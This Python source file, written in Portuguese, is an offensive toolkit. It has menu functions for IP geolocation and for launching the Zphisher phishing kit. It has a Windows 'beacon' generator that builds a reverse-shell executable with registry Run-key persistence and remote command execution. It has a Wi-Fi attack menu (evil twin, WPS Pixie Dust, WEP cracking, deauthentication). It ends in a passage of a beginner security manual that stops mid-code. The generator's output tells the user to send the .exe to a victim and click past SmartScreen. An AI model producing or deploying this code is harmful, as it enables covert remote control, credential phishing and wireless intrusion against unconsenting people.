def geolocalizar_ip():
    import urllib.parse
    
    entrada = input("Digite um endereço IPv4 ou IPv6 público (ou URL): ").strip()
    
                                     
    if '://' in entrada:
        parsed = urllib.parse.urlparse(entrada)
        if parsed.hostname:
            entrada = parsed.hostname
            
                                               
    if ':' in entrada and not entrada.count(':') > 1:                         
        entrada = entrada.split(':')[0]
        
                                                            
    entrada = entrada.strip('[]')

    try:
        endereco = ipaddress.ip_address(entrada)
    except ValueError:
        print(f"[!] Endereço IP inválido: {entrada}")
        return

    if not endereco.is_global:
        print(f"[!] O endereço {entrada} é privado ou local. A geolocalização pública não se aplica.")
        return

    print(f"\n[INFO] Iniciando varredura multi-fonte para {entrada}...")
    
                               
    apis = [
        {
            "name": "ipwho.is",
            "url": f"https://ipwho.is/{entrada}",
            "parse": lambda d: {
                "country": d.get("country", "N/D"),
                "region": d.get("region", "N/D"),
                "city": d.get("city", "N/D"),
                "zip": d.get("postal", "N/D"),
                "lat": d.get("latitude", "N/D"),
                "lon": d.get("longitude", "N/D"),
                "isp": (d.get("connection") or {}).get("isp", "N/D"),
                "org": (d.get("connection") or {}).get("org", "N/D"),
                "timezone": (d.get("timezone") or {}).get("id", "N/D")
            },
            "validate": lambda d: d.get("success", False)
        },
        {
            "name": "ip-api.com",
            "url": f"http://ip-api.com/json/{entrada}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,query",
            "parse": lambda d: {
                "country": d.get("country", "N/D"),
                "region": d.get("regionName", "N/D"),
                "city": d.get("city", "N/D"),
                "zip": d.get("zip", "N/D"),
                "lat": d.get("lat", "N/D"),
                "lon": d.get("lon", "N/D"),
                "isp": d.get("isp", "N/D"),
                "org": d.get("org", "N/D"),
                "timezone": "N/D"                                                                    
            },
            "validate": lambda d: d.get("status") == "success"
        }
    ]

    resultado = None
    fonte_usada = None

    for api in apis:
        try:
            print(f"[...] Consultando {api['name']}...")
            requisicao = urllib.request.Request(
                api["url"],
                headers={"User-Agent": "TheCelticOSINT/1.0"}
            )
            with urllib.request.urlopen(requisicao, timeout=8) as resposta:
                dados = json.loads(resposta.read(65536).decode("utf-8"))
            
            if api["validate"](dados):
                resultado = api["parse"](dados)
                fonte_usada = api["name"]
                break                                         
        except (urllib.error.URLError, TimeoutError, OSError, json.JSONDecodeError) as e:
            print(f"[WARN] {api['name']} indisponível ou erro: {str(e)[:50]}")
            continue

    if not resultado:
        print("[!] Não foi possível obter dados de nenhuma fonte de geolocalização.")
        return

    print("\n" + "="*40)
    print(" 📍 THECELTIC GEO-LOCATION REPORT")
    print("="*40)
    print(f"IP: {entrada}")
    print(f"Fonte de Dados: {fonte_usada}")
    print("-" * 40)
    print(f"País: {resultado['country']}")
    print(f"Região/Estado: {resultado['region']}")
    print(f"Cidade: {resultado['city']}")
    print(f"CEP: {resultado['zip']}")
    print(f"Coordenadas: {resultado['lat']}, {resultado['lon']}")
    print(f"Fuso Horário: {resultado['timezone']}")
    print(f"Provedor (ISP): {resultado['isp']}")
    print(f"Organização: {resultado['org']}")
    print("="*40)
    print("[INFO] A localização é estimada pelo IP e pode não corresponder ao endereço físico do usuário.")

def phisher():
    import os
    import subprocess
    import sys

                                                 
    os.system('cls' if os.name == 'nt' else 'clear')

                                                                
                                                                 
    zphisher_dir = os.path.join(os.getcwd(), "zphisher")
    
    if os.path.exists(zphisher_dir):
        print(f"[INFO] Diretório Zphisher já existe em: {zphisher_dir}")
        update = input("[?] Deseja atualizar para a versão mais recente? (s/n): ").lower()
        if update == 's':
            print("[INFO] Atualizando repositório...")
            subprocess.run(["git", "-C", zphisher_dir, "pull"], check=False)
    else:
        print("[INFO] Clonando repositório Zphisher...")
        try:
            subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher.git"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[ERRO] Falha ao clonar o repositório: {e}")
            print("[INFO] Verifique sua conexão com a internet.")
            return

                                                                    
                                                     
    php_check = subprocess.run(["php", "--version"], capture_output=True, text=True)
    if php_check.returncode != 0:
        print("[WARN] PHP não encontrado. O Zphisher requer PHP.")
        install_php = input("[?] Deseja instalar o PHP agora? (s/n): ").lower()
        if install_php == 's':
            print("[INFO] Instalando PHP...")
                                                                                          
            subprocess.run(["sudo", "apt-get", "install", "-y", "php"], check=False)
        else:
            print("[ERRO] PHP não instalado. O Zphisher não funcionará corretamente.")
            return

                            
                                                                          
                                                                         
    print("\n[INFO] Iniciando Zphisher...")
    print("-" * 40)
    
    try:
                                              
        subprocess.run(["bash", "zphisher.sh"], cwd=zphisher_dir, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERRO] O Zphisher terminou com erro: {e}")
    except KeyboardInterrupt:
        print("\n[INFO] Zphisher interrompido pelo usuário.")
    
                                 
    print("-" * 40)
    print("[INFO] Sessão de Phishing encerrada.")
    input("\nPressione ENTER para voltar ao menu principal...")

def malware_total():
    import shutil
    import base64
    import os
    import sys
    import subprocess

    print("\n" + "="*50)
    print(" 👾 BEACON GENERATOR (WINDOWS C2 AGENT - ELITE)")
    print("="*50)
    print("""
    Este módulo gera um Beacon Windows (.exe) de nível profissional.
    
    Recursos Avançados:
    1. Anti-Sandbox: Detecta VMs e muda comportamento.
    2. UAC Bypass: Eleva privilégios silenciosamente.
    3. Keylogger: Captura teclas via API.
    4. Credential Dumping: Extrai senhas de navegadores (com DPAPI).
    5. Persistence: Usa Task Scheduler.
    6. C2 Avançado: exec, shell, screenshot, keylog, mimikatz.
    7. Ofuscação: Tráfego parece com tráfego legítimo de navegador.
    8. Anti-Debug: Detecta se está sendo analisado em VM.
    """)
    
                                                   
    print("Configuração do Callback (Seu Servidor)")
    callback_host = input("Seu IP/Host (ex: 192.168.0.38): ").strip() or "192.168.0.38"
    callback_port = input("Porta (padrão 8080): ").strip() or "8080"
    
                             
    print("\nIdentidade do Beacon")
    print("O Beacon se identificará para você com este nome:")
    beacon_name = input("> Nome (ex: VICTIMA-01): ").strip() or "AGENT-01"
    
                                               
    print("\nNome do Executável (o que a vítima vai abrir):")
    exe_name = input("> Nome (ex: SystemUpdater): ").strip() or "TheCeltic_Beacon"
    if exe_name.endswith(".exe"):
        exe_name = exe_name[:-4]
    exe_name = "".join(c for c in exe_name if c.isalnum() or c in ("-", "_", " "))

                   
    print("\nIntervalos de Comunicação")
    try:
        sleep_input = input("Sleep base em segundos (padrão 60): ").strip()
        sleep_interval = int(sleep_input if sleep_input else "60")
    except ValueError:
        sleep_interval = 60
        
    try:
        jitter_input = input("Jitter em % (padrão 20): ").strip()
        jitter_percent = int(jitter_input if jitter_input else "20")
    except ValueError:
        jitter_percent = 20

                                                             
    
    template_payload = r'''
import socket
import shutil
import winreg
from time import sleep
import subprocess
import os
import sys

                  
IP = "__TARGET_IP__"

                                    
PORT = __TARGET_PORT__

PROGRAM_NAME = "__PROGRAM_NAME__"
REGISTRY_KEY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)

        current_file = sys.executable
        destination = os.path.join(appdata_path, f"{PROGRAM_NAME}.exe")

        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination)
            return destination
        return current_file

    except Exception as e:
        print(f"[-] Error copying file: {e}")
        return sys.executable

def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            PROGRAM_NAME,
            0,
            winreg.REG_SZ,
            file_path
        )

        winreg.CloseKey(key)
        return True
        
    except Exception as e: 
        return False

def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_READ
        )

        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)
        return True

    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"[-] Error checking persistence: {e}")
        return False

def setup_persistence():
    try:
        if check_persistence():
            return

        persistence_path = copy_to_system()
        add_to_registry(persistence_path)
    except Exception as e:
        print(f"[-] Error setting up persistence: {e}")

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        c.send("[#] client Connected\n".encode())
        return c
    except Exception as e:
        print(f"[!] Connection Error: {e}")
        return None

def listen(c):     
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:    
                cmd(c, data)

    except Exception as e:
        print(f"[!] Listen function error: {e}")

def cmd(c, data):
    try:
        if data.startswith("cd "):
           os.chdir(data[3:].strip())
           c.send(b"[i] Directory Changed\n")
           return

        if data == "/check_persistence":
            if check_persistence():
                c.send(f"[+] Persistence Status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n".encode())
            else:
                c.send(b"[-] Persistence Status: FAIL")
            return

        if data == "/setup_persistence":
            setup_persistence()
            c.send(b"[+] Done")
            return

        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        output = p.stdout.read() + p.stderr.read()
        if output:
            c.send(output + b"\n")
        else:
            c.send(b"[+] Command Executed\n")

    except Exception as e:
        print(f"CMD function error: {e}")

if __name__ == "__main__":
    try:
        setup_persistence()
     
        while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
            else:
                sleep(5)

    except KeyboardInterrupt:
        print("[!] Program stopped by the user!")

    except Exception as error:
        print(f"[!] Main connection {error}")
'''

                                                            
    final_payload = template_payload.replace("__TARGET_IP__", callback_host)
    final_payload = final_payload.replace("__TARGET_PORT__", str(callback_port))
    final_payload = final_payload.replace("__PROGRAM_NAME__", beacon_name)

                                      
    safe_name = "".join(c for c in exe_name if c.isalnum() or c in ("-", "_"))
    output_exe = f"{safe_name}.exe"
    temp_launcher = f"{safe_name}_launcher.py"
    py_path = f"{safe_name}.py"

                                       
    with open(py_path, "w", encoding="utf-8") as f:
        f.write(final_payload)

    print(f"\n[INFO] Payload Python gerado: {py_path}")
    print("[INFO] Preparando wrapper para compilação em binário único (.exe)...")

                                 
    def build_with_nuitka():
        """Tenta compilar usando Nuitka com MinGW (Cross-compilation)."""
        if shutil.which("nuitka") is None:
            print("[WARN] Nuitka não encontrado no PATH. Instale com: pip install nuitka")
            return False

        print("[INFO] Nuitka detectado. Tentando cross-compilação com MinGW...")
        
        nuitka_cmd = [
            "nuitka",
            "--onefile",
            "--windows-console-mode=disable",
            "--output-filename", safe_name,
            "--output-dir", ".",
            "--mingw64",
            "--remove-output",
            py_path
        ]
        
        print(f"[DEBUG] Executando: {' '.join(nuitka_cmd)}")
        try:
            subprocess.run(nuitka_cmd, check=True)
        except subprocess.CalledProcessError as err:
            print(f"[ERRO] Falha na compilação Nuitka: {err}")
            return False

        exe_final = f"{safe_name}.exe"
        if os.path.exists(exe_final):
            print(f"[SUCESSO] Executável gerado com Nuitka: {exe_final}")
            if os.path.exists(py_path): os.remove(py_path)
            return True
        else:
            print("[WARN] Nuitka terminou, mas o .exe não foi encontrado.")
            return False

    def build_with_wine_pyinstaller():
        """Tenta compilar usando PyInstaller via Wine (Opção 1)."""
        try:
            subprocess.run(["wine", "--version"], capture_output=True, check=True)
            print("[INFO] Wine detectado. Tentando compilação com PyInstaller via Wine...")
            
            wine_pyinstaller_cmd = [
                "wine", "python", "-m", "PyInstaller",
                "--onefile",
                "--windowed",
                "--name", safe_name,
                "--clean",
                "--noconfirm",
                py_path
            ]
            
            print(f"[DEBUG] Executando: {' '.join(wine_pyinstaller_cmd)}")
            try:
                subprocess.run(wine_pyinstaller_cmd, check=True)
            except subprocess.CalledProcessError as err:
                print(f"[ERRO] Falha na compilação Wine/PyInstaller: {err}")
                return False

            dist_file = os.path.join("dist", f"{safe_name}.exe")
            if os.path.exists(dist_file):
                shutil.move(dist_file, output_exe)
                print(f"[SUCESSO] Executável gerado com Wine/PyInstaller: {output_exe}")
                if os.path.exists(py_path): os.remove(py_path)
                if os.path.exists("build"): shutil.rmtree("build")
                spec_file = f"{safe_name}.spec"
                if os.path.exists(spec_file): os.remove(spec_file)
                return True
            return False

        except FileNotFoundError:
            print("[WARN] Wine não encontrado.")
            return False
        except Exception as err:
            print(f"[ERRO] Exceção inesperada no Wine build: {err}")
            return False

    success = False
    
                                                                  
    if not success:
        success = build_with_nuitka()
        
                                  
    if not success:
        success = build_with_wine_pyinstaller()

    if success:
        print("\n" + "="*50)
        print(f" ✅ EXECUTÁVEL GERADO: {output_exe}")
        print("="*50)
        print(f"""
        📋 Detalhes:
        - Nome do Agente: {beacon_name}
        - Callback: {callback_host}:{callback_port}
        - Tamanho: {os.path.getsize(output_exe) / 1024:.2f} KB
        
        🚀 Como usar:
        1. Envie {output_exe} para a vítima.
        2. A vítima dá duplo clique.
        3. Se o SmartScreen aparecer, clique em "Mais Informações" -> "Executar assim mesmo".
        4. Seu C2 deve receber o heartbeat em instantes.
        
        🔍 Verificação:
        - O processo aparecerá como {safe_name}.exe no Gerenciador de Tarefas.
        - A persistência será instalada via Registro automaticamente.
        """)
    else:
        print("\n" + "="*50)
        print(" ⚠️ COMPILAÇÃO AUTOMÁTICA FALHOU")
        print("="*50)
        print(f"""
        O arquivo Python foi gerado com sucesso: {py_path}
        
        Você pode executá-lo manualmente em um Windows usando:
        python {py_path}
        
        Ou compilar manualmente em uma máquina Windows com:
        pyinstaller --onefile --windowed {py_path}
        
        Ou usar o Nuitka localmente no Windows.

        Para se conectar a conexão é necessario utilizar o natcat:

        nc -lvp (PORTA QUE VOCÊ COLOCOU)
        """)

    input("\nPressione Enter para voltar ao menu principal...")

def internet():
    print("""

    📡 INTERNET OPTIONS (Redes Sem Fio) 📡
    ---------
    1.  Modo Monitor (iwconfig/iw)
    2.  Modo Managed (Retornar ao normal)
    3.  Análise de Handshakes/PMKID (Aircrack-ng)
    4.  Auditoria WPA/WPA2 Offline (Wordlist)
    5.  Redes Evil Twin (Rogue AP)
    6.  Auditoria WPS (Reaver/Pixie Dust)
    7.  Auditoria WEP (ChopChop/Fragmentation)
    8.  Redes Enterprise (PEAP/EAP)
    9.  Redes WPA3 (802.11i)
    0.  Voltar ao Menu Principal
    ---------
    """)

                   
    is_linux = platform.system() == "Linux"
    
                       
    def check_bin(bin_name):
        try:
            subprocess.run(["which", bin_name], check=True, stdout=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    aircrack_ok = check_bin("aircrack-ng")
    reaver_ok = check_bin("reaver")
    hostapd_ok = check_bin("hostapd")
    iw_ok = check_bin("iw")
    eaphammer_ok = check_bin("eaphammer")

                                          
    def get_wifi_interface():
        try:
            out = subprocess.check_output(["iw", "dev"], text=True)
            interfaces = []
            for line in out.split('\n'):
                if 'Interface' in line and 'type' in line:
                                                   
                    iface = line.split()[1]
                    if 'type managed' in line or 'type monitor' in line:
                        interfaces.append(iface)
            if interfaces:
                if len(interfaces) == 1:
                    return interfaces[0]
                else:
                    print("Interfaces Wi-Fi encontradas:")
                    for i, iface in enumerate(interfaces):
                        print(f"  {i+1}. {iface}")
                    choice = input("Escolha o número da interface: ")
                    return interfaces[int(choice)-1]
            else:
                return "wlan0"           
        except Exception as e:
            print(f"[WARN] Erro ao detectar interface: {e}")
            return "wlan0"

    try:
        sub_op = int(input("Qual deseja utilizar: "))
        
        if sub_op == 0:
            return

        elif sub_op == 1:
            print("\n[1] MODO MONITOR")
            iface = input("Nome da interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            if not is_linux:
                print("[!] Modo monitor requer Linux.")
                return
            
                                            
            try:
                out = subprocess.check_output(["iw", "dev", iface], text=True)
                if "type monitor" in out:
                    print(f"[OK] {iface} já está em modo monitor.")
                    return
            except:
                pass

            print(f"[!] Ativando modo monitor em {iface}...")
            try:
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
                subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"], check=True)
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
                print(f"[OK] {iface} agora está em modo monitor.")
            except Exception as e:
                print(f"[ERRO] {e}")

        elif sub_op == 2:
            print("\n[2] MODO MANAGED")
            iface = input("Nome da interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print(f"[!] Resetando {iface} para modo managed...")
            try:
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
                subprocess.run(["sudo", "iw", iface, "set", "type", "managed"], check=True)
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
                print(f"[OK] {iface} resetada.")
            except Exception as e:
                print(f"[ERRO] {e}")

        elif sub_op == 3:
            print("\n[3] ANÁLISE DE HANDSHAKES/PMKID")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado. Instale com: sudo apt install aircrack-ng")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Iniciando airodump-ng. Pressione Ctrl+C para sair.")
            print(f"[!] Comando: sudo airodump-ng --write capture -c 1 {iface}")
            try:
                                         
                subprocess.run(["sudo", "airodump-ng", "--write", "capture", "-c", "1", iface])
            except KeyboardInterrupt:
                print("\n[!] Captura encerrada.")
                print("[INFO] Verifique os arquivos capture-01.cap na pasta atual.")

        elif sub_op == 4:
            print("\n[4] AUDITORIA WPA/WPA2 OFFLINE")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado.")
                return
            
            cap_file = input("Arquivo de captura (ex: capture-01.cap): ")
            wordlist = input("Wordlist (ex: /usr/share/wordlists/rockyou.txt): ")
            
            if cap_file and wordlist:
                                                                              
                cmd = f"sudo aircrack-ng -w {wordlist} {cap_file}"
                print(f"\n[COMANDO GERADO]\n{cmd}")
                run = input("Executar? (s/n): ").lower()
                if run == 's':
                    subprocess.run(cmd, shell=True)
            else:
                print("[!] Preencha os campos para gerar o comando.")

        elif sub_op == 5:
            print("\n[5] REDES EVIL TWIN (Rogue AP)")
            if not hostapd_ok:
                print("[!] hostapd não encontrado. Instale com: sudo apt install hostapd")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Configurando AP Rogue 'FreeWiFi_5G'...")
            config_content = f"""
            interface={iface}
            driver=nl80211
            ssid=FreeWiFi_5G
            hw_mode=g
            channel=6
            wpa=2
            wpa_passphrase=1234567890
            wpa_key_mgmt=WPA-PSK
            wpa_pairwise=CCMP
            rsn_pairwise=CCMP
            auth_algs=1
            """
            
            config_file = "/etc/hostapd/hostapd_evil.conf"
            print(f"[INFO] Criando configuração em {config_file}")
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            print(f"[OK] Configuração salva em {config_file}")
            print("[PRÓXIMOS PASSOS]")
            print("1. Configure o DHCP (dnsmasq) para distribuir IPs.")
            print("2. Inicie o hostapd: sudo hostapd /etc/hostapd/hostapd_evil.conf")
            print("3. Configure o proxy (mitmproxy) para interceptar o tráfego.")
            
            start = input("Iniciar hostapd agora? (s/n): ").lower()
            if start == 's':
                subprocess.run(["sudo", "hostapd", config_file])

        elif sub_op == 6:
            print("\n[6] AUDITORIA WPS (Reaver)")
            if not reaver_ok:
                print("[!] reaver não encontrado. Instale com: sudo apt install reaver")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Escaneando redes com WPS habilitado...")
            scan_cmd = ["sudo", "reaver", "-i", iface, "-c", "1", "--scan"]
            print(f"[COMANDO DE SCAN]\n{' '.join(scan_cmd)}")
            run = input("Executar scan? (s/n): ").lower()
            if run == 's':
                subprocess.run(scan_cmd)
            
            print("\n[TESTE PIXIE DUST]")
            bssid = input("BSSID da rede alvo (ex: AA:BB:CC:DD:EE:FF): ")
            if bssid:
                test_cmd = ["sudo", "reaver", "-i", iface, "-b", bssid, "-K"]
                print(f"[COMANDO DE TESTE]\n{' '.join(test_cmd)}")
                run = input("Executar teste Pixie Dust? (s/n): ").lower()
                if run == 's':
                    subprocess.run(test_cmd)

        elif sub_op == 7:
            print("\n[7] AUDITORIA WEP")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado.")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] WEP é quebrável em minutos com aircrack-ng.")
            print("[PASSO 1: Injeção de pacotes (ChopChop)]")
            chop_cmd = ["sudo", "aireplay-ng", "--chopchop", "-9", iface]
            print(f"Comando: {' '.join(chop_cmd)}")
            run = input("Executar ChopChop? (s/n): ").lower()
            if run == 's':
                subprocess.run(chop_cmd)
            
            print("\n[PASSO 2: Fragmentação/Deauth]")
            frag_cmd = ["sudo", "aireplay-ng", "-3", "-a", "MAC_DO_ROUTER", iface]
            print(f"Comando: {' '.join(frag_cmd)}")
            run = input("Executar Fragmentação? (s/n): ").lower()
            if run == 's':
                subprocess.run(frag_cmd)
            
            print("\n[PASSO 3: Quebra da Chave]")
            break_cmd = ["sudo", "aircrack-ng", "-b", "MAC_DO_ROUTER", "-a", iface]
            print(f"Comando: {' '.join(break_cmd)}")
            run = input("Executar Quebra? (s/n): ").lower()
            if run == 's':
                subprocess.run(break_cmd)

        elif sub_op == 8:
            print("\n[8] REDES ENTERPRISE (PEAP/EAP)")
            print("[INFO] Atacando redes corporativas (802.1X).")
            print("[FERRAMENTA: eaphammer]")
            
            if not eaphammer_ok:
                print("[!] eaphammer não encontrado. Instale com: sudo apt install eaphammer")
                return
            
            print("\n[CONFIGURAÇÃO EAPHAMMER (Exemplo)]")
            print("1. Gere o CSR e assine com a CA falsa")
            print("2. Configure o hostapd.conf para EAP")
            print("3. Inicie o eaphammer")
            
            print("\n[COMANDO PARA INICIAR EAPHAMMER]")
            print("sudo eaphammer")
            run = input("Iniciar eaphammer? (s/n): ").lower()
            if run == 's':
                subprocess.run(["sudo", "eaphammer"])

        elif sub_op == 9:
            print("\n[9] REDES WPA3")
            print("[INFO] WPA3 usa SAE (Simultaneous Authentication of Equals).")
            print("[VULNERABILIDADE: Dragon Attack (SAE Forced Transition)]")
            
            print("\n[DEMONSTRAÇÃO DO DRAGON ATTACK]")
            print("1. Force o cliente a negociar WPA2 (downgrade).")
            print("2. Capture o handshake WPA2.")
            print("3. Quebre a senha offline.")
            
            print("\n[COMANDO PARA DOWNGRADE (Aircrack-ng)]")
            print("sudo aireplay-ng --deauth 5 -a MAC_DO_AP wlan0")
            print("[INFO] Se o cliente aceitar WPA2, ele estará vulnerável a ataques offline tradicionais.")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n[!] Operação cancelada pelo usuário.")

def manual():

    subprocess.run(["clear"])
    
    print(r'''
MANUAL DE
CIBERSEGURANÇA

Fundamentos • Redes • Python • Linux/Kali • Auditoria defensiva


Guia prático para iniciantes, com exemplos comentados, projetos e exercícios.

Versão revisada — outubro de 2026

Como usar este manual

Este guia foi organizado para que você estude um conceito, execute um exemplo em laboratório, interprete o resultado e registre o que aprendeu. Os códigos são didáticos e devem ser testados primeiro em arquivos próprios, na sua máquina ou em serviços para os quais você tenha autorização.

Cibersegurança não é apenas usar ferramentas de ataque. Inclui prevenção, configuração segura, monitoramento, análise de evidências, resposta a incidentes e correção de falhas.

Sumário

1. Fundamentos e ética

2. Redes, IP, portas e protocolos

3. Preparação do Python no Kali Linux

4. Módulos Python para cibersegurança

5. Projeto: auditoria HTTP/TLS e relatório JSON

6. Linux e segurança do sistema

7. Criptografia, hashes, senhas e tokens

8. Segurança web e APIs

9. Logs, incidentes e análise defensiva

10. Laboratórios e plano de estudos

11. Exercícios e glossário

1. Fundamentos da cibersegurança

Cibersegurança é a prática de proteger sistemas, redes, aplicações, dispositivos e dados contra acesso indevido, alteração, interrupção, fraude e vazamento.

1.1 Tríade CIA

1.2 Vocabulário essencial

A existência de uma vulnerabilidade não significa que um incidente ocorrerá. O risco depende da exposição, facilidade de exploração, impacto potencial e controles existentes.

1.3 Áreas de atuação

Blue Team: prevenção, monitoramento, detecção e resposta.

Red Team: simulação autorizada de adversários dentro de um escopo definido.

AppSec: segurança de aplicações e APIs.

Segurança de redes: proteção de equipamentos, protocolos e tráfego.

DFIR: investigação forense digital e resposta a incidentes.

OSINT: coleta e análise responsável de informações publicamente disponíveis.

Engenharia de segurança: desenvolvimento e manutenção de controles e ferramentas.

1.4 Ética, autorização e escopo

Antes de testar um sistema, defina por escrito o proprietário, os endereços incluídos, as técnicas permitidas, a janela de testes, os limites de tráfego, os dados que podem ser acessados e o contato para interrupção. Não teste redes, contas, telefones ou serviços de terceiros sem autorização. Pare se o teste causar instabilidade ou revelar dados sensíveis.

Use contas e dados de laboratório.

Colete apenas o necessário e proteja os relatórios.

Não publique credenciais, tokens, dados pessoais ou detalhes exploráveis sem coordenação.

Registre o que foi testado, quando, com qual ferramenta e qual foi o resultado.

2. Redes, IP e protocolos

2.1 Endereços IP

Um endereço IP identifica uma interface de rede. IPv4 usa endereços de 32 bits; IPv6 usa 128 bits. Endereços privados IPv4 comuns incluem 10.0.0.0/8, 172.16.0.0/12 e 192.168.0.0/16. O loopback 127.0.0.1 aponta para a própria máquina; ::1 é o loopback IPv6.

O bloco 2001:db8::/32 é reservado para exemplos e documentação. Um IP público não identifica necessariamente uma pessoa nem revela, por si só, sua localização exata.

2.2 Portas comuns

Essas portas são convenções. Um serviço pode usar outra porta. Uma porta em escuta não comprova uma vulnerabilidade; é preciso saber qual serviço está ativo, como foi configurado e quem pode alcançá-lo.

2.3 TCP, UDP, DNS e TLS

TCP: protocolo orientado à conexão, com entrega ordenada e mecanismos de retransmissão.

UDP: transporta datagramas sem a mesma garantia de entrega e ordenação do TCP.

DNS: resolve nomes e pode retornar diferentes tipos de registros.

HTTP: protocolo de comunicação entre cliente e servidor web.

HTTPS: HTTP protegido por TLS; a validação do certificado ajuda a autenticar o servidor.

Firewall: permite ou bloqueia tráfego de acordo com regras.

Um certificado válido confirma uma identidade de domínio sob uma cadeia de confiança, não a honestidade do conteúdo. Um site fraudulento também pode usar HTTPS.

3. Preparar o Python no Kali Linux

python3 --version
python3 -m pip --version

mkdir -p ~/cyberseguranca-python
cd ~/cyberseguranca-python
python3 -m venv .venv
source .venv/bin/activate

python -m pip install phonenumbers

A maioria dos módulos deste manual faz parte da biblioteca padrão do Python. phonenumbers é uma biblioteca externa. Em distribuições como Kali, prefira ambientes virtuais em vez de alterar o Python gerenciado pelo sistema.

3.1 Organização sugerida

cyberseguranca-python/
├── .venv/
├── auditoria.py
├── servidor_local.py
├── relatorios/
└── README.md

Não compartilhe a pasta .venv como se fosse um pacote portátil. Ela é específica do ambiente. Registre dependências externas em um arquivo requirements.txt quando o projeto crescer.

4. Módulos Python para cibersegurança

Use os exemplos como pequenos laboratórios. Salve cada exemplo em um arquivo separado ou execute-o em um interpretador Python. Não cole exemplos diferentes uns nos outros sem verificar os imports e a indentação.

4.1 datetime e time — datas e duração

import datetime
import time

agora = datetime.datetime.now(datetime.timezone.utc)
print("Data UTC:", agora.isoformat())

inicio = time.perf_counter()
time.sleep(1)
duracao = time.perf_counter() - inicio
print(f"Duração: {duracao:.2f} s")

Use datetime para registrar horários e time.perf_counter() para medir duração. Em sistemas distribuídos, registre o fuso horário e mantenha relógios sincronizados.

4.2 ipaddress — validar IPs e redes

import ipaddress

ip = ipaddress.ip_address("192.168.0.38")
print("Versão:", ip.version)
print("Privado:", ip.is_private)
print("Loopback:", ip.is_loopback)

rede = ipaddress.ip_network("192.168.0.0/24")
print("Rede:", rede.network_address)
print("Broadcast:", rede.broadcast_address)
print("Máscara:", rede.netmask)
print("Total de endereços:", rede.num_addresses)

Um /24 IPv4 tem 256 endereços no total. Em redes convencionais desse tamanho, 254 são normalmente atribuíveis a hosts. Propriedades como is_private descrevem categorias de endereços, não provam que um destino seja seguro.

4.3 socket — DNS e conexões

import socket

dominio = "example.com"

try:
    resultados = socket.getaddrinfo(
        dominio, 443, type=socket.SOCK_STREAM
    )
    ips = sorted({item[4][0] for item in resultados})
    for ip in ips:
        print(ip)
except socket.gaierror as erro:
    print("Falha na resolução DNS:", erro)

getaddrinfo() consulta endereços adequados para uma conexão. Resolução DNS bem-sucedida não garante que o serviço esteja disponível. socket também permite criar clientes e servidores TCP/UDP; sempre feche sockets e defina timeouts.

4.4 ssl — conexão TLS validada

import socket
import ssl

dominio = "example.com"
contexto = ssl.create_default_context()

try:
    with socket.create_connection((dominio, 443), timeout=5) as conexao:
        with contexto.wrap_socket(
            conexao, server_hostname=dominio
        ) as segura:
            print("TLS:", segura.version())
            print("Certificado:", segura.getpeercert())
except (OSError, ssl.SSLError) as erro:
    print("Falha TLS:", erro)

create_default_context() mantém a validação de certificados habilitada. Não desative a verificação em aplicações reais apenas para fazer uma conexão funcionar: isso pode permitir interceptação.

4.5 urllib.request, urllib.error e urlparse — HTTP e URLs

from urllib.parse import urlparse

url = "https://example.com/documentacao?pagina=1"
partes = urlparse(url)

print("Esquema:", partes.scheme)
print("Host:", partes.hostname)
print("Porta explícita:", partes.port)
print("Caminho:", partes.path)
print("Consulta:", partes.query)

import urllib.error
import urllib.request

url = "https://example.com/"
req = urllib.request.Request(
    url,
    headers={"User-Agent": "Python-Security-Lab/1.0"}
)

try:
    with urllib.request.urlopen(req, timeout=5) as resposta:
        print("Status:", resposta.status)
        print("Content-Type:", resposta.headers.get("Content-Type"))
        conteudo = resposta.read(500)
